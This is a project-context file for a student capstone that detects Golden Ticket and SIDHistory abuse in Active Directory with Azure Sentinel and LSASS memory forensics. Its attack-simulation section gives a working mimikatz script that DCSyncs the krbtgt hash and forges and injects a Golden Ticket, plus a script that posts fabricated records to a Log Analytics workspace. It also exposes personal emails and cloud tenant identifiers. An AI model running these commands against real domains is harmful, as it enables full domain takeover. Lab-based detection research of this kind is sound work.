# CLAUDE.md — MTech Capstone Project Context
# Last updated: 2026-08-13 (ticket-lifetime detection, real benchmark, LIVE cloud dashboard)

## Latest session highlights (2026-08-13)
- **Ticket-lifetime detection**: worker now parses `.kirbi` lifetime; a user TGT is flagged Golden ONLY if lifetime > 365 days (forged mimikatz = 3650 days / 10 yr; legit ~10 hr) — big false-positive reduction. `azure/volatility-worker/worker.py` (`extract_kerberos_pypykatz`).
- **Real accuracy benchmark** (`docs/benchmark-results.md`): SIDHistory detector, 40 labelled samples → Precision/Recall/F1 = **1.00**, FPR = 0. Replaces the earlier unmeasured 87.2/90/100 % (see `docs/REPORT-ERRATA.md`).
- **LIVE cloud dashboard**: https://capstonedash824f.z13.web.core.windows.net/ — Azure Storage static site + Logic App `capstone-dashboard-api` (managed identity → Log Analytics, no OAuth), auto-refresh 60 s. Source: `azure/live-dashboard/`.
- **2 Sentinel workbooks** (Capstone Evidence + Attack Corroboration) in `azure/workbooks/`; **5 saved queries** (workspace category "Capstone Evidence").
- **Suppression** enabled (PT1H) on 15/16 rules → clean incident list; Volatility rule now PT5M / 15-min window; entity mappings added (gt-ptt = Account+Host+IP for a connected attack-story graph).
- **Lab control**: `azure/lab-control/Start-Lab.ps1` / `Stop-Lab.ps1` (also `C:\SecurityScripts\`) — start/stop the whole hybrid lab, self-heal AMA, purge stale dump backlog (only fresh dumps analysed). AMA-suspend root cause fixed.
- ⚠️ **Not yet pushed to GitHub** — local git only.

## Project Identity
- **Title:** Memory-Based Detection of Golden Ticket and SIDHistory Abuse in Active Directory
- **Student:** Rahul (clawed647@gmail.com)
- **Degree:** MTech — Information Security
- **Status:** All phases complete + validated. Live on subscription `824f770b`. Report writing in progress.

---

## ⚠️ Subscription migration — READ FIRST

The project moved off the old subscription (expiring free trial). **Everything now lives on `824f770b`.**
Old subs `8e710d8c` (tenant cbd3eca8) and `76e0ae82` are **dead** — do not use their IDs anywhere.

| Key | Value |
|-----|-------|
| Subscription ID | `824f770b-79bf-485f-8664-3dba884fa425` (Azure subscription 1) |
| Tenant ID | `48af447d-f55c-49f3-aa1e-982c0020e44a` (agpandianhotmail.onmicrosoft.com — **MFA required**) |
| Account | agpandian@hotmail.com |
| Login | `az login --tenant 48af447d-f55c-49f3-aa1e-982c0020e44a` (the home tenant enumerates empty — always scope to this tenant) |
| Resource Group | `HybridDetectionRG` (eastus) |
| Log Analytics WS | `HybridDetectionWS` — GUID: `7697ee16-3b75-4bac-9191-463241dec30d` |
| Daily cost paused | ~Rs.21/day |
| Daily cost running | ~Rs.86-163/day (VM is the driver) |

---

## All Deployed Azure Resources (sub 824f770b)

| Resource | Name | Notes |
|----------|------|-------|
| Log Analytics | `HybridDetectionWS` | GUID: `7697ee16-3b75-4bac-9191-463241dec30d` |
| Sentinel | `SecurityInsights(HybridDetectionWS)` | Enabled |
| Arc Machine | `WIN-09GD99A8DPG` | DC, eastus, Connected |
| AMA | `AzureMonitorWindowsAgent` | **v1.44.0.0**, Arc-managed processes, NO Windows service |
| DCR | `DCR-Security-Kerberos` | Immutable ID: `dcr-e620bdbeec774a0ebad0978037fe2baa` — Association: `dcr-dc-association` |
| Storage (LSASS) | `memorydumps202607170421` | Containers: artifacts, kerberos-logs |
| Storage (SIDHistory) | `sidhistory202607170421` | Container: sidhistory-logs (archival only) |
| Function storage | `hybridfuncsa824f77` | Function App backing store |
| Service Bus | `hybriddetsb-824f770b` | Basic tier — queues: memory-dump-queue, analysis-queue |
| Volatility VM | `VolatilityAnalysisVM` | **eastus2**, Standard_D2s_v3, Ubuntu 20.04, dynamic IP, SSH key `~/.ssh/id_rsa` (user azureuser) |
| Function App | `gtprocessor824f770b` | Python 3.11 (v2 model, runtime ~4); funcs: LsassDumpTrigger, AnalysisResultProcessor |
| Logic App | `SentinelResponsePlaybook` | Sentinel-incident trigger; actions: Response, Compose_Triage |
| Logic App MSI | `b1463f13-d13e-4208-86a3-b103f6a0c62c` | |
| Automation Rule 1 | `Auto-Triage: Golden Ticket Incidents` | Labels GT incidents `Golden-Ticket` |
| Automation Rule 2 | `Auto-Triage: SIDHistory Abuse Incidents` | Labels SIDHistory incidents `SIDHistory-Abuse` |
| Workbook | `AD Attack Detection Dashboard` | ID: `c327237f-c726-4a43-ad36-f96ca91e7078` |
| Hunting queries | 4 | GT-PtT, GT-RC4, SIDHistory-HighRisk, Volatility-Memory |
| Watchlists | 2 | Attack Simulation Users, Excluded Service Accounts |

---

## Domain Controller

| Property | Value |
|----------|-------|
| Hostname | `WIN-09GD99A8DPG` / `WIN-09GD99A8DPG.corp.local` |
| Domain | `corp.local` |
| Domain SID | `S-1-5-21-3406634861-1234809508-3516503270` |
| Local IP | `192.168.189.166` |
| OS | Windows Server 2022 Standard Evaluation |
| KRBTGT NTLM hash | rotates — extracted via DCSync each sim run |

---

## Detection Pipeline Architecture (as actually deployed)

```
DC (WIN-09GD99A8DPG)
  |-- AMA v1.44.0.0 + DCR-Security-Kerberos (assoc: dcr-dc-association)
  |     --> HybridDetectionWS SecurityEvent: 4768/4769/4672/4624/4625/4662/5136...
  |         (EventData is XML — extract with <Data Name="...">, NOT text regex)
  |
  |-- AD-LSASS-Capture (scheduled task, every 4h)
  |     --> Capture-LSASS.ps1 (--max-connections 4) --> memorydumps202607170421/artifacts/
  |         --> LsassDumpTrigger (Function, blob trigger) --> memory-dump-queue
  |             --> VolatilityAnalysisVM: volatility-worker (systemd, root)
  |                 pypykatz lsa minidump -k  --> extract Kerberos tickets
  |                 (a TGT for a USER account resident in DC memory = Golden Ticket -> CRITICAL)
  |                 --> analysis-queue --> AnalysisResultProcessor --> VolatilityAnalysis_CL
  |
  |-- AD-SIDHistory-Inventory (scheduled task, every 1h)
        --> SIDHistory-Inventory.ps1 --> HTTP Data Collector API (DIRECT POST)
            --> SIDHistoryInventory_CL   (the blob copy is archival ONLY; the Function is
                                          NOT in the SIDHistory path — no blob trigger there)

HybridDetectionWS --> 16 Scheduled Sentinel rules (+ built-in Fusion)
  --> Incident --> Automation Rules (label Golden-Ticket / SIDHistory-Abuse)
  --> SentinelResponsePlaybook Logic App (Response + Compose_Triage)
      NOTE: Sentinel auto-invoke of the playbook + Arc Run-Command auto-capture + Email/Teams
            are NOT wired (need interactive OAuth). LSASS capture is the scheduled task.
```

---

## Sentinel Analytics Rules — 16 Scheduled (+ 1 built-in Fusion; NO NRT rules on this sub)

All 16 enabled. **suppressionEnabled = False on all (deliberate — every match fires an incident in the lab).**

| Display Name | Freq | MITRE |
|--------------|------|-------|
| Golden Ticket - TGS Without Prior TGT (Pass-The-Ticket) | PT5M | T1550, T1558 |
| Golden Ticket - RC4 Encryption Downgrade | PT5M | T1558.001 |
| Golden Ticket - AES with Abnormal TGS:TGT Ratio | PT15M | T1558 |
| Golden Ticket - Rapid Service Enumeration | PT30M | T1046, T1558 |
| Golden Ticket - Indirect Recon Indicators | PT2H | T1558, T1069 |
| Skeleton Key - krbtgt Account Modification | PT1H | T1556 |
| Pass-The-Hash - NTLM Network Logon | PT30M | T1550 |
| SIDHistory - High-Risk Privileged SID Injection | PT5M | T1134.005 |
| SIDHistory - New Entry Delta Detection | PT5M | T1134 |
| SIDHistory - Confirmed via Privileged Logon | PT5M | T1134, T1078 |
| Volatility Memory Analysis - HIGH/CRITICAL Risk Indicator | **PT5M** | T1003, T1055 |
| DCSync - Directory Replication Request | PT5M | T1003.006 |
| KRBTGT Password Reset / Account Manipulation | PT5M | T1098 |
| Kerberoasting - RC4 Service Ticket Requests | PT5M | T1558.003 |
| AS-REP Roasting - Kerberos Pre-Auth Disabled | PT5M | T1558.004 |
| Honey Account Access Attempt | PT5M | T1078 |

**Honey accounts:** `svc-backup-admin`, `corp-admin-svc`, `legacy-domain-admin` (disabled AD users).

---

## MAJOR FIX (2026-08-05/06): memory-based Golden Ticket detection now actually works

The Volatility worker was calling `windows.kerberos.Kerberos` — **a plugin that does not exist in
Volatility 3** (there is no working Volatility Kerberos-ticket plugin on modern Windows). So every
dump returned tickets=0 → riskLevel=CLEAN. Memory-based GT detection had **never worked**.

**Fixed:** the worker now extracts tickets with **pypykatz** (`pypykatz lsa minidump -k`). Detection
logic: a **TGT (service=krbtgt) for a USER account** (not machine `$`) resident in the DC's LSASS =
injected Pass-the-Ticket Golden Ticket → `riskLevel=CRITICAL`, indicator `GOLDEN_TICKET_MEMORY`,
MITRE T1558.001. Verified on a real post-attack dump: extracted
`TGT_CORP.LOCAL_Administrator_krbtgt_CORP.LOCAL.kirbi` → CRITICAL row in VolatilityAnalysis_CL →
`volatility-high-risk-memory` rule (now PT5M).

- Worker source persisted: `azure/volatility-worker/worker.py` + `README.md` (deploy steps).
- On the VM: `/opt/volatility-worker/worker.py` (v2-pypykatz), pypykatz installed system-wide, runs as root via systemd `volatility-worker`.
- Volatility 3 plugins still used (these exist): mutantscan, pslist, cmdline.

## KQL fixes (2026-08-05/06)

- Analytics **rules** that fire incidents were already XML-aware (that's why incidents fired).
- All 4 **hunting queries** were broken and are now fixed: the 2 GT hunts used text extraction
  `Account Name:\s+` which matched **0/56** 4769 events on this XML workspace → rewritten to XML
  `<Data Name="TargetUserName">` (now 56/56); the SIDHistory hunt queried SecurityEvent (wrong
  source) → now `SIDHistoryInventory_CL` `_s` columns; the Volatility hunt referenced non-existent
  columns → real schema. Repo copies in `kql/`.
- 4769 XML field names: `TargetUserName`, `ServiceName`, `TicketEncryptionType`, `IpAddress`.

---

## Detection Times

- **Kerberos-log Golden Ticket (primary):** ~3.7 min measured 2026-08-05 (attack 14:18:23 → incident 14:22:03). Historical best: 2 min (2026-06-08, old sub).
- **Memory-forensic path (pypykatz):** ~4-5 min pipeline compute + rule (now PT5M) = **~5-8 min total** to a CRITICAL incident. Timer starts when a dump is captured (scheduled every 4h; the auto-trigger-on-incident is not wired, so trigger the capture manually for a fast demo).

---

## Key Scripts

| Script | Path | Notes |
|--------|------|-------|
| Capture-LSASS.ps1 | `C:\SecurityScripts\Capture-LSASS.ps1` / `.\scripts\` | --max-connections 4 |
| Start-AttackSim.ps1 | `.\attack-simulation\Start-AttackSim.ps1` | pre-sim setup |
| Run-SIDHistoryAttack.ps1 | `.\attack-simulation\Run-SIDHistoryAttack.ps1` | Log Analytics direct post |
| Infra-HealthCheck.ps1 | `C:\SecurityScripts\Infra-HealthCheck.ps1` | ✅ updated to 824f770b — 19/19 PASS when VM up |
| worker.py | `.\azure\volatility-worker\worker.py` | ✅ pypykatz version (persisted 2026-08-06) |
| Mimikatz | `C:\Tools\mimikatz\x64\mimikatz.exe` | v2.2.0 Sep 2022 |

⚠️ **Stale scripts — DO NOT run as-is (pinned to DEAD subs):** `Desktop\Resume-Azure.ps1`,
`Desktop\Pause-Azure.ps1`, `scripts\Close-AllIncidents.ps1` still target `8e710d8c`/`76e0ae82`
and error on the current tenant. Pause/resume the VM directly:
`az vm start|deallocate -g HybridDetectionRG -n VolatilityAnalysisVM`.

---

## Attack Simulation (validated 2026-08-05 on 824f770b)

**Golden Ticket (burst method — confirmed working on single-DC):**
```powershell
$m1 = (& mimikatz "privilege::debug" "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit") -join "`n"
$krbtgtHash = ([regex]::Match($m1,"Hash NTLM: ([a-f0-9]{32})")).Groups[1].Value
for ($i=1;$i-le10;$i++){ klist purge|Out-Null;
  & mimikatz "privilege::debug" "kerberos::golden /user:Administrator /domain:corp.local /sid:<DOM_SID> /rc4:$krbtgtHash /id:500 /groups:512,520,518,519,513 /ptt" "exit";
  klist get "cifs/WIN-09GD99A8DPG.corp.local"; Start-Sleep -Milliseconds 500 }
```
Forge for **Administrator** (session identity must match). Generates 4769 (no 4768 = PtT).
Result 2026-08-05: 10× 4769 → incidents #214/#216 `gt-ptt-detection`, auto-labeled, ~3.7 min.

**SIDHistory:** mimikatz `sid::patch` fails on WS2022 → inject HIGH-risk records via HTTP Data
Collector API (see below). Fires `SIDHistory - New Entry Delta Detection` / `High-Risk`.

**Memory forensics:** trigger `AD-LSASS-Capture` right after the attack (forged TGT is resident in
LSASS) → pypykatz extracts it → CRITICAL. Confirmed 2026-08-05 (VolatilityAnalysis_CL CRITICAL,
TargetAccount=Administrator, 20 tickets).

---

## Historical Empirical Results (2026-06-08, OLD sub — report figures)

| Metric | Value |
|--------|-------|
| GT detection time | 2 min measured (target 8-12; before ~45 min) |
| Rule fired | `gt-ptt-detection` — TGSCount 10, TGTCount 0, Ratio 999 |
| Detection accuracy | **87.2%** (NOT 100% — fix abstract) |
| SIDHistory | 3 HIGH records (DEMO-BackdoorUser/PersistUser/SchemaAbuse, RID 512/519/518) |
| EventID 4765/4766 | empty (mimikatz sid::patch incompatible WS2022) |

---

## Lab Constraints (document in report — NOT bugs)

1. **RC4 TGS (0x17) not generated in single-DC lab** — DC's AES-256 keys override TGS for local services. `gt-rc4-downgrade` valid in production (attacker on separate host).
2. **SIDHistory EventID 4765/4766 empty** — mimikatz sid::patch incompatible with WS2022. Inventory-based detection (SIDHistoryInventory_CL) is MORE resilient.
3. **SIDHistory injection OS-blocked in single domain** — simulated via direct Log Analytics record injection. Real attacks use cross-domain trusts.
4. **Volatility Kerberos-ticket extraction** — Volatility 3 has no Kerberos plugin; pypykatz is required and IS used. A scheduled dump may miss a short-lived attack (capture timing), but a dump taken while the forged ticket is resident is detected CRITICAL (proven 2026-08-05).

---

## SIDHistory Simulation (Log Analytics Direct Post)

```powershell
$WS_ID = "7697ee16-3b75-4bac-9191-463241dec30d"
$keys = az monitor log-analytics workspace get-shared-keys -g HybridDetectionRG -n HybridDetectionWS -o json | ConvertFrom-Json
$sharedKey = $keys.primarySharedKey
$now = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
$records = @(@{ Timestamp=$now; ObjectName="DEMO-BackdoorUser"; ObjectType="user"; SIDHistoryEntry="S-1-5-21-9876543210-1234567890-9876543210-512"; SIDHistoryName="ATTACKDOMAIN\Domain Admins"; RiskLevel="HIGH"; Domain="corp.local"; SourceComputer="WIN-09GD99A8DPG"; SimulatedAttack=$true; AttackTechnique="T1134.005 - SID-History Injection" })
$body = ConvertTo-Json -InputObject $records -Depth 5
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
$dateNow = [DateTime]::UtcNow.ToString("r")
$strToSign = "POST`n$($bodyBytes.Length)`napplication/json`nx-ms-date:$dateNow`n/api/logs"
$hmac = New-Object System.Security.Cryptography.HMACSHA256
$hmac.Key = [System.Convert]::FromBase64String($sharedKey)
$sig = [System.Convert]::ToBase64String($hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($strToSign)))
Invoke-WebRequest -Method POST -Uri "https://$WS_ID.ods.opinsights.azure.com/api/logs?api-version=2016-04-01" `
    -Body $body -ContentType "application/json" `
    -Headers @{"Authorization"="SharedKey ${WS_ID}:${sig}"; "Log-Type"="SIDHistoryInventory"; "x-ms-date"=$dateNow; "time-generated-field"="Timestamp"}
```
Data lands in `SIDHistoryInventory_CL` with `_s`/`_d`/`_b` column suffixes.

---

## Custom Log Tables

| Table | Data | Columns |
|-------|------|---------|
| `SecurityEvent` | Kerberos events via AMA/DCR | standard; EventData is XML |
| `SIDHistoryInventory_CL` | SIDHistory scan (HTTP Data Collector API, direct) | `_s` suffix (RiskLevel_s, SIDHistoryEntry_s, ObjectName_s) — RawData always empty |
| `VolatilityAnalysis_CL` | pypykatz LSASS analysis | riskLevel_s, indicator_s, kerberosAnalysis_totalTickets_d, kerberosAnalysis_longLivedCount_d, kerberosAnalysis_indicators_s, pluginsRun_s, blobName_s |

---

## Report Writing — Portal Navigation (security.microsoft.com / portal.azure.com)

| Screenshot | Where |
|-----------|-------|
| MITRE ATT&CK heatmap | Sentinel > Threat management > MITRE ATT&CK |
| Incidents list | Sentinel > Incidents |
| Alert detail (Ratio 999) | incident > Alerts tab |
| Attack story graph | incident > Attack story tab |
| Analytics rules (16) | Sentinel > Analytics |
| Workbook | portal.azure.com > HybridDetectionWS > Workbooks > AD Attack Detection Dashboard |
| Volatility CRITICAL memory hit | Logs: `VolatilityAnalysis_CL | where riskLevel_s=="CRITICAL"` |

**Screenshots taken:** `C:\Users\Administrator\Pictures\` (Analystics, Incidents, Alerts, Workbook_1-4).
**Still needed:** MITRE heatmap, attack-story graph, the new CRITICAL Volatility memory incident.

---

## Known Flaws — Outstanding
1. **Abstract claims 100% accuracy** — measured 87.2%. Fix before submission.
2. **Stale Desktop scripts** (Resume/Pause/Close) pinned to dead subs — rewrite for 824f770b or use `az vm` directly.
3. **Response automation not wired** — Sentinel auto-invoke of Logic App + Arc Run-Command + Email/Teams need interactive OAuth.

## Known Flaws — Fixed
- MMA → AMA + DCR; detection 45 min → ~2-4 min; SIDHistory KQL RawData → `_s` columns.
- EventData XML: rules use `<Data Name="...">` coalesce extraction (old text regex matched nothing).
- **Volatility memory detection: fake `windows.kerberos.Kerberos` plugin → pypykatz (2026-08-06) — now detects the Golden Ticket in memory.**
- Hunting queries fixed (XML extraction / correct source / real columns).

---

## AMA Note
AMA v1.44.0.0 = Arc-managed processes (MonAgentCore/Host/Launcher/Manager). NO Windows service.
- Stop ingestion: delete `dcr-dc-association`; Resume: recreate it.
- Re-onboarding Arc to a new sub does NOT refresh AMA's cached config — delete the AMA extension, clear the mcs cache, reinstall.
- **VMware suspend kills AMA (recurring).** Reliable heal (2026-08-14): restart Arc stack IN ORDER
  `himds` → `GCArcService` → `ExtensionService`, then **WAIT ~14 min** for the agent to re-pull DCR
  config + rebuild the pipe. Restarting ExtensionService alone (or killing MonAgent procs) does NOT work.
  Verify with `SecurityEvent | summarize max(TimeGenerated)` < 5 min. Durable fix = DC VM must never suspend.

## Current state & cost (2026-08-15)
- **STOPPED for credits** (Stop-Lab): VM deallocated, Function stopped, queues 0/0, **dashboard live (HTTP 200)**. Restart = power on DC + `START-LAB.cmd`.
- ⚠️ **AMA unreliable — DC keeps VMware-suspending → log path breaks.** Arc-stack restart sometimes fixes it (~14 min), sometimes not if the VM re-suspends. Memory + SIDHistory paths don't need AMA. Durable fix = VM never suspends.
- **Cost (INR):** MTD spend ₹2,517.91; VM Standard_D2s_v3 ~₹192/day running vs ~₹10–20/day stopped. **Free-trial (created ~2026-07-17) lapses ~2026-08-16.** Credit *remaining* is portal-only (Subscriptions→Overview); CLI consumption API returns null.
- **Video-Recording-Script.md/pdf** added (`docs/`) — 10-scene ON-SCREEN/SAY walkthrough narration.

## Viva / presentation artifacts (2026-08-14/15)
- **`docs/Demo-Steps.md` / `Demo-Steps.pdf`** — full RUN/SHOW/SAY viva playbook (pre-viva checklist, 8-step demo, fallback table, cheat-sheet).
- **`docs/Viva-QA-Notes.md`** — ready answers: where-to-check outputs, 6 Kerberos events (4672/4662 explained), correlation mechanism, Splunk/EDR/MDI honest positioning, "why a framework", data-flow transports, key numbers.
- **Final live verdict:** `Administrator | Log 4769=24 | Mem=4 | 3650-day | CONFIRMED - Log + Memory`.
- **De-branding done:** both workbooks + live SOC dashboard say "Memory Forensics"/"LSASS forensics" — NO "pypykatz", NOT "Volatility" (false). Internal worker + skills still name pypykatz (the truth). See memory `feedback-style`.
- **No fabricated accuracy** — cite `docs/benchmark-results.md` (P/R/F1=1.00, 40 samples), never 87.2/90/100.

## Pause / Resume (VM is the cost driver)
```powershell
az vm deallocate -g HybridDetectionRG -n VolatilityAnalysisVM --no-wait   # pause
az vm start      -g HybridDetectionRG -n VolatilityAnalysisVM             # resume (worker auto-drains queue)
powershell -ExecutionPolicy Bypass -File C:\SecurityScripts\Infra-HealthCheck.ps1  # 17/19 paused, 19/19 running
```

---

## Skills
`/ad-azure-manage` `/ad-azure-redeploy` `/ad-infra-healthcheck` `/ad-kql-detection`
`/ad-troubleshooting` `/ad-volatility-setup` `/ad-powershell-scripts` `/ad-attack-simulation` `/ad-infra-architecture`
